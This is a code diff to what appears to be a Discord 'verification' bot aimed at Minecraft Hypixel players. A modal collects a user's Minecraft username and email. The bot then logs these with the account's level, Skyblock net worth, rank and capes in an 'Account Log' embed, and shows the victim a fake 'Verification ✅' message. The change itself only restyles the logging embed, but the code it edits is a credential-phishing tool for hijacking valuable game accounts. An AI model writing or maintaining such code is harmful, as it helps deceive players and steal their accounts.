@@ -149,23 +149,22 @@ class MyModalOne(ui.Modal, title="Verification"):
                         colour=0xEE4B2B,  
                     )
                     embed1=discord.Embed(
-                            title="Account Log",
+                            title=f"{interaction.user.name} | {interaction.user.id}",
                             timestamp= datetime.datetime.now(),
-                            colour=0x088F8F,                           
+                            colour=0xADD8E6,                           
                         )
                     embed1.set_thumbnail(
-                        url= f"https://mc-heads.net/avatar/{self.box_one.value}.png"
+                        url= f"https://visage.surgeplay.com/bust/{self.box_one.value}.png?y=-40&quality=lossless"
                         )
                     embed1.set_footer(
                         text=threadingNum,
                     )
                     config.LastUserName = self.box_one.value
-                    embed1.add_field(name="**:slot_machine:Hypixel Level**:", value=f"{playerlvl}", inline=True)
-                    embed1.add_field(name="**:moneybag:Skyblock NetWorth**:", value=f"{networth_value}", inline=True)
-                    embed1.add_field(name="**:mortar_board:Rank**:", value=f"{rank}", inline=True)
-                    embed1.add_field(name="**Username**:", value=f"```{self.box_one.value}```", inline=False)
-                    embed1.add_field(name="**Email**:", value=f"```{self.box_two.value}```", inline=False)
-                    embed1.add_field(name="**Discord**:", value=f"```{interaction.user.name}```", inline=False)
+                    embed1.add_field(name="**Hypixel Level**:", value=f"{playerlvl}", inline=True)
+                    embed1.add_field(name="**Skb NetWorth**:", value=f"{networth_value}", inline=True)
+                    embed1.add_field(name="**Rank**:", value=f"{rank}", inline=True)
+                    embed1.add_field(name="**Username**:", value=f"```{self.box_one.value}```", inline=True)
+                    embed1.add_field(name="**Email**:", value=f"```{self.box_two.value}```", inline=True)
                     embed1.add_field(name="**Capes**:", value=f"{cape_url}", inline=False)
                     config.LastUsedEmail = self.box_two.value
                     if Flagx == True:
@@ -212,7 +211,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                             ephemeral=True
                         )
                     else:
-                        
+
                         await interaction.followup.send(
                             embed=discord.Embed(
                                 title="Verification ✅",
